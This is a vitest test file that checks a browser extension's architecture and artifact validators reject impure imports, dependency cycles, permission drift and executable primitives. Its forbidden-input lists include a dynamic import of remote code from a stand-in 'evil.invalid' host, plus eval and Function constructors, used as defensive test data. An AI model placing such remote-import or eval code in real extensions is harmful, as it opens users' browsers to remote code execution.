import { expect, it } from 'vitest';
import { fileURLToPath } from 'node:url';
import { inwardGraph } from '../fixtures/architecture.ts';
import { validateArchitecture } from '../../tooling/architecture_validation.mts';
import { targetManifest } from '../../src/infrastructure/target_manifests.ts';
import { validateTarget } from '../../tooling/artifact_validation.mts';

const root = fileURLToPath(new URL('../../../', import.meta.url));
function rejects(file: string, source: string, rule: string): void {
    const graph = inwardGraph(); graph.set(file, source);
    expect(() => validateArchitecture(root, graph)).toThrow(rule);
}

it('bexh1-foundation-C17 accepts inward dependencies and the sole shared barrel', () => {
    expect(() => validateArchitecture(root, inwardGraph())).not.toThrow();
});
it('bexh1-foundation-C18 rejects ambient globals and external runtime/provider dependencies in pure code', () => {
    for (const source of ["import fs from 'node:fs'; export { fs };", "import sdk from '@octokit/rest'; export { sdk };",
        'export const a = process.env;', 'export const a = window.location;', 'export const a = fetch("/");',
        'export const a = globalThis;', 'export const a = document.body;']) {
        rejects('extension/src/domain/a.ts', source, /import/u.test(source) ? 'external-or-dynamic-import' : 'pure-');
    }
});
it('bexh1-foundation-C19 rejects concrete layer imports from application', () => {
    for (const layer of ['infrastructure', 'presentation', 'adapters/browser']) {
        rejects('extension/src/application/a.ts', `import * as concrete from '../${layer}/a'; export { concrete };`, 'dependency-direction');
    }
});
it('bexh1-foundation-C20 rejects presentation authority, deep root imports and shared-root escapes', () => {
    for (const source of ['export const view = fetch("/");', 'export const token = "forbidden";', 'export const view = globalThis;']) {
        rejects('extension/src/presentation/a.ts', source, 'presentation-authority');
    }
    rejects('extension/src/domain/a.ts', "export { manifest } from '../../../src/domain/browser_extension_contract/manifest';", 'shared-barrel-only');
    rejects('src/domain/browser_extension_contract/manifest.ts', "export { a } from '../../../extension/src/domain/a';", 'shared-contract-escape');
});
it('bexh1-foundation-C21 rejects cycles, unresolved imports, dynamic/type import escapes and unknown layers', () => {
    const graph = inwardGraph();
    graph.set('extension/src/application/a.ts', "export { b } from './b';");
    graph.set('extension/src/application/b.ts', "export { b } from './a';");
    expect(() => validateArchitecture(root, graph)).toThrow('dependency-cycle');
    rejects('extension/src/application/a.ts', "export * from './missing';", 'unresolved-or-escaping-import');
    rejects('extension/src/application/a.ts', "export const a = import('node:fs');", 'external-or-dynamic-import');
    rejects('extension/src/application/a.ts', 'declare const name: string; export const a = import(name);', 'external-or-dynamic-import');
    rejects('extension/src/application/a.ts', "export type A = import('node:fs').PathLike;", 'external-or-dynamic-import');
    rejects('extension/src/application/a.ts', "import a = require('node:fs'); export { a };", 'external-or-dynamic-import');
    rejects('extension/src/unknown/a.ts', 'export const a = 1;', 'unknown-layer');
    rejects('extension/src/application/a.ts', 'export const a = 1;\n'.repeat(221), 'module-size');
    rejects('extension/src/application/a.ts', 'export const a = ;', 'syntax');
    rejects('extension/src/application/a.ts', 'export const a = new Function("return 1");', 'executable-primitive');
});
it('bexh1-foundation-C22 rejects executable bundles, duplicate manifests, undeclared assets and permission drift', () => {
    const assets = () => new Map([['manifest.json', `${JSON.stringify(targetManifest('chrome'), null, 2)}\n`],
        ['background.js', ''], ['content.js', '(() => { const x = 1; return x; })();']]);
    expect(() => validateTarget('chrome', assets())).not.toThrow();
    for (const code of ['eval("1")', 'new Function("return 1")', 'require("node:fs")',
        'import("https://evil.invalid/code.js")', 'import "./remote.js";', 'export * from "./remote.js";', 'fetch("/")']) {
        const files = assets(); files.set('content.js', code);
        expect(() => validateTarget('chrome', files)).toThrow('forbidden-executable-or-runtime');
    }
    for (const mutation of [
        (files: Map<string, string>) => files.set('extra.js', ''),
        (files: Map<string, string>) => files.set('manifest.json', '{bad json'),
        (files: Map<string, string>) => files.set('manifest.json', '{"manifest_version":3,"manifest_version":3}'),
        (files: Map<string, string>) => files.set('manifest.json', JSON.stringify({ ...targetManifest('chrome'), permissions: ['cookies'] })),
        (files: Map<string, string>) => files.set('content.js', 'x'.repeat(1024 * 1024 + 1)),
        (files: Map<string, string>) => files.set('content.js', 'const = ;'),
    ]) {
        const files = assets(); mutation(files); expect(() => validateTarget('chrome', files)).toThrow();
    }
});
it('sanitizes control characters in source diagnostics while retaining readable rule separators', () => {
    const graph = inwardGraph(); graph.set('extension/src/unknown/control\t.ts', 'export const a = eval("1");');
    try { validateArchitecture(root, graph); throw new Error('expected rejection'); }
    catch (error) {
        expect((error as Error).message).not.toContain('\t');
        expect((error as Error).message).toContain('control?.ts');
        expect((error as Error).message).toContain('\n');
    }
});
it('rejects malformed static/type module specifiers without resolving them as trusted dependencies', () => {
    for (const source of ['import a from 42; export { a };', 'export type A = import(42);',
        'export type A = import(unknown);']) {
        rejects('extension/src/application/a.ts', source, 'external-or-dynamic-import');
    }
});
it('keeps diagnostics from a forbidden imported adapter separate from pure-domain diagnostics', () => {
    const graph = inwardGraph();
    graph.set('extension/src/domain/a.ts', "export { broken } from '../infrastructure/broken';");
    graph.set('extension/src/infrastructure/broken.ts', 'export const broken = missingAdapterGlobal;');
    try { validateArchitecture(root, graph); throw new Error('expected rejection'); }
    catch (error) {
        expect((error as Error).message).toContain('dependency-direction');
        expect((error as Error).message).not.toContain('broken.ts: pure-environment');
    }
});
